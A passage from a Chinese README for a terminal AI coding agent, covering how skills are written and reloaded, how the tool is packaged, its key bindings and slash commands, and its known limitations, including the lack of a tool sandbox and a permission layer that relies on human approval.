- 记忆/会话/MCP 用的也是同一个 `.codetui/` 目录约定（`~/.codetui/` 与 `<项目根>/.codetui/`）。

### SKILL.md 格式

YAML frontmatter（至少 `name` 与 `description`）+ 正文：

```markdown
---
name: systematic-debugging
description: Use when encountering any bug, test failure, or unexpected behavior, before proposing fixes
---

# Systematic Debugging

...方法论/操作步骤正文（会被注入给模型）...
```

- `description` 决定模型「何时该调用」——写清触发场景，别只写标题。
- 正文即注入内容；过长会占用上下文，按需精简。

### 目录布局示例

```
~/.codetui/skills/
├── systematic-debugging/
│   └── SKILL.md
└── chrome-devtools/
    └── SKILL.md            # 例：装官方 chrome-devtools-mcp 的 skill

<项目根>/.codetui/skills/
└── writing-plans/
    └── SKILL.md            # 项目专属，随仓库提交
```

### 生效与热加载

- 运行中新增/删除/修改 `SKILL.md` 后，在 code-tui 里执行 **`/reload`** 重扫两层目录即生效——**无需重启**；即便启动时零技能，也能 `/reload` 出第一个新增技能。
- `/skills` 查看当前可用清单（含来源层标注），`/skill` 为本条消息手动指定一个技能。

### 装第三方技能（如 chrome-devtools-mcp 官方 skill）

第三方技能仓库若采用 `skills/<名>/SKILL.md` 布局（如 [chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp/tree/main/skills)），直接把对应子目录拷到上面两层之一即可：

```bash
# 全局对所有项目生效
mkdir -p ~/.codetui/skills
cp -r /path/to/chrome-devtools-mcp/skills/chrome-devtools ~/.codetui/skills/
# 或只对当前项目生效
cp -r /path/to/chrome-devtools-mcp/skills/chrome-devtools <项目根>/.codetui/skills/
```

放好后 `/reload`，`/skills` 即可见。

> 注意：技能是**软引导**（提示模型「该怎么做」），并非硬约束——例如它可引导模型优先用 `take_snapshot`（文本）而非 `take_screenshot`，但**挡不住**模型把大文件/图片读进上下文。真正防止上下文被撑爆需在代码层加防线（工具输出限幅、拒读二进制），技能只降低触发概率。

## 发布打包（可分发、解压即运行）

打一个自包含发布包（含启动脚本 + 主 jar + 全部运行期依赖），需 JDK 17+：

```bash
mvn -pl springai-code-tui clean package -Pdist
```

产出（`-Pdist` profile 触发，默认 `package` 不打，保持日常构建轻量）：

- `target/springai-code-tui-<version>-dist.tar.gz`
- `target/springai-code-tui-<version>-dist.zip`

解压后目录结构：

```
springai-code-tui-<version>/
├── bin/code-tui         # 启动脚本（sh；自动定位安装目录与 java）
├── bin/code-tui.cmd     # 启动脚本（Windows）
├── springai-code-tui.jar
├── lib/*.jar            # 全部运行期依赖
└── README.md
```

在目标机器上运行（先配好 API key，切到可随意丢弃的项目目录）：

```bash
tar xzf springai-code-tui-<version>-dist.tar.gz
export DEEPSEEK_API_KEY=你的key
cd /path/to/some/disposable/project
/path/to/springai-code-tui-<version>/bin/code-tui
```

> 也可直接 `java -jar /path/to/springai-code-tui-<version>/springai-code-tui.jar`——jar 的
> manifest 里 `Class-Path` 相对自身定位同级 `lib/`，与 cwd 无关。

## 项目文档（docs/）

本项目文档目录 `docs/` 按用途分层组织：

| 目录 | 内容 |
|------|------|
| `release-notes/` | 每版发版说明（新功能详解、下载物与 SHA-256 校验和），索引见根目录 [CHANGELOG.md](../CHANGELOG.md)。 |
| `superpowers/specs/` | 功能设计方案（改动前先写：问题、方案取舍、验收标准）。 |
| `superpowers/plans/` | 由 spec 派生的实施计划（逐任务、逐步骤、含实施记录与踩坑复盘）。权限管理的设计与实施全过程即在 `2026-07-31-permission-mode*.md`。 |

改动流程是 **spec → plan → TDD**（见根目录 [CONTRIBUTING.md](../CONTRIBUTING.md)）；plan 里保留实施记录与变异测试结论，是这套代码「为什么长这样」的第一手材料。

## 操作键

| 按键 | 行为 |
| --- | --- |
| Enter | 发送输入框中的消息 |
| `\` + Enter | 在输入框内换行（终端无关） |
| ↑ / ↓ | 回溯 / 前进已提交的历史消息（多行时先在行内移动光标） |
| Ctrl+A / Ctrl+E | 光标跳到行首 / 行尾 |
| Ctrl+← / Alt+← / Alt+B | 光标向左按词跳（中文按单字跳） |
| Ctrl+→ / Alt+→ / Alt+F | 光标向右按词跳（中文按单字跳） |
| Ctrl+W / Alt+Backspace | 删除光标前一个词（空白为界；中文按单字删） |
| Ctrl+U / Ctrl+K | 删到行首 / 删到行尾（以当前逻辑行为界，不跨行） |
| Shift+Tab | 循环权限模式（默认 → 自动接受编辑 → 计划模式 → 默认；当前档位常驻状态栏） |
| Esc | 取消当前正在进行的回合（工具调用/模型生成）；审批面板打开时 = 拒绝并中断本回合 |
| Ctrl+C | 退出程序 |

审批面板打开时：↑↓ 选择、`1`-`5` 快选（只移动高亮，仍需 Enter 确认）、Enter 确认、Esc 中断。

计划审批面板（计划模式下模型调 `ExitPlanMode` 时弹出，计划正文打进上方滚动区、面板只放选项）：↑↓ 选择、`1`-`3` 快选（同样只移动高亮）、Enter 确认、Esc 中断本回合。选第 3 项「继续完善计划」会进入一行反馈输入：打字后 Enter 提交（可留空），Esc 退回选项。

## 斜杠命令

输入 `/` 会弹出命令补全菜单（↑↓ 选择、Tab 补全、Enter 运行、Esc 关闭）：

| 命令 | 行为 |
| --- | --- |
| `/model` | 打开模型选择器，在当前 provider 的模型间切换 |
| `/compact` | 手动压缩会话历史 |
| `/clear` | 清空当前上下文、开一个全新空会话（旧会话留盘，可 `-c` 恢复）；同时清屏并复位面板 |
| `/context` | 查看上下文用量（事件数 / token） |
| `/skill` | 为本条消息指定技能 |
| `/skills` | 查看可用技能清单（模型按需自动调用） |
| `/reload` | 重新扫描技能目录（运行中新增/删除的 `SKILL.md` 生效，无需重启） |
| `/mcp` | 管理 MCP 服务器：列出全部（含禁用/失败项），Enter 启用/禁用（即时生效 + 回写 `mcp.json`），Tab 展开工具清单（仅空闲时可用） |
| `/permissions` | 查看当前权限模式、生效的全部规则（含来源层）与内置底线摘要（**只读**，改规则请编辑 `permissions.json` 或用审批面板的「永久允许」） |
| `/continue` | 续跑上次未完成的计划 |
| `/help` | 显示可用命令与快捷键 |
| `/exit` | 退出程序 |

## 已知限制

- **滚动区不可翻页**：对话滚动区依赖终端自身的 scrollback，程序内不支持翻页控件（输入框 ↑↓ 回溯的是「已提交的历史消息」，与滚动区翻页无关；历史仅内存态，退出不保留）。
- **宽字符光标对齐**：输入框光标位置按显示宽度（东亚宽字符计 2 列）对齐，但极端的 grapheme 组合（如某些 emoji ZWJ 序列、组合字符）可能出现轻微偏移。
- **部分 Ctrl 组合键不可绑定**：终端把 `Ctrl+A..Z` 发成控制字节 1~26，其中 `Ctrl+H/I/J/M` 与 Backspace/Tab/Enter 字节相同、无法区分，故编辑快捷键避开了这几个字母；`Shift/Alt+Enter` 换行能否生效取决于终端能否区分修饰键（Apple Terminal 等区分不了），可靠换行请用 `\` + Enter。
- **无工具沙箱**：见上方安全声明——权限层是**执行前的人工确认**，不是边界强制；批准之后所有工具（含文件系统工具）仍不受 root 约束。自写的真沙箱（`SandboxedShellTool` 等校验所有工具路径参数）列为后续增强项，本版本未实现。
- **权限层本期未做的**：
  - **无规则编辑界面**：`/permissions` 只读。删规则要手动编辑 `permissions.json`，程序内只能加（审批面板的「永久允许」）不能删。
  - **无工具自审接缝的实现方**：判定顺序第 3 步（工具自己声明本次调用的危险度）是预留插槽，本期没有工具实现它。
  - **规则不区分子 agent**：主 agent 与子 agent 共用同一套规则与模式，不能只给某类子 agent 更严的权限。
  - **审批面板逐个排队**：多个子 agent 并发触发审批时面板一个一个弹（队列上限 8 条），不能批量处理。
  - **计划模式下子 agent 只能做只读调查**：它与主 agent 共用同一个引擎，故写操作照样被 DENY。它会收到一段**专属的**系统提示（说明自己处于只读调查阶段、把发现报告回主 agent 就是交付），但**没有 `ExitPlanMode`**——提交计划是主 agent 的事。所以计划模式下派子 agent 去调查是正常用法，派它去做会落盘的事则做不成。
    > 子 agent 的提示段刻意**不与主 agent 版统一**：主 agent 版结尾指向 `ExitPlanMode`，而子 agent 的工具集里根本没有这个工具，照抄等于指一条走不通的路——把「不知道为什么被拒」换成「知道了、照做了、还是失败」，比不给提示更糟。
- **无程序内会话选择器**：会话已持久化并按项目隔离（见上「会话持久化与恢复」），但程序内不能浏览/切换历史会话；`-c` 只恢复**最近一次**会话（按 mtime），要挑更早的需手动操作会话文件。
- **子 agent 无后台模式**：`Task` 单个前台阻塞、`ParallelTasks` 一批并发前台执行（有界并发，全部 join 后返回）；暂不支持后台任务（`run_in_background` + 轮询回收）与 `/tasks` 详情面板（列为后续增强）。
- **长期记忆无「自动整理」**：跨会话长期记忆已具备（见上「长期记忆」），但暂未接入定期 consolidation（自动汇总/去重冗余记忆）触发器；记忆的增删改全由模型按需驱动。
- **MCP 仅 stdio、管理粒度为整 server**：本期只支持 stdio 传输（`sse`/`streamable-http` 远程 server 已预留传输接缝但未实现，配了会跳过）。`/mcp` 可运行期启用/禁用**启动时已声明**的 server（即时生效 + 回写 `enabled`），但**新增/删除条目或改 `command`/`args` 等仍需重启**（面板条目集在启动期定型）；管理粒度为整个 server，不细到单个工具。工具名未做长度截断与跨 server 碰撞去重——默认 DeepSeek 无 64 字符上限、实测工具名远短于此且碰撞需刻意构造，故本期可接受。**退出清理为「有界优先」**：`/exit` 时关闭子进程硬限 2s，若某 server 恰在 2s 内未优雅关完，进程会被 JVM 退出带走、可能短暂残留由 OS 回收——这是「不卡退出」优先于「保证优雅清理」的有意取舍。
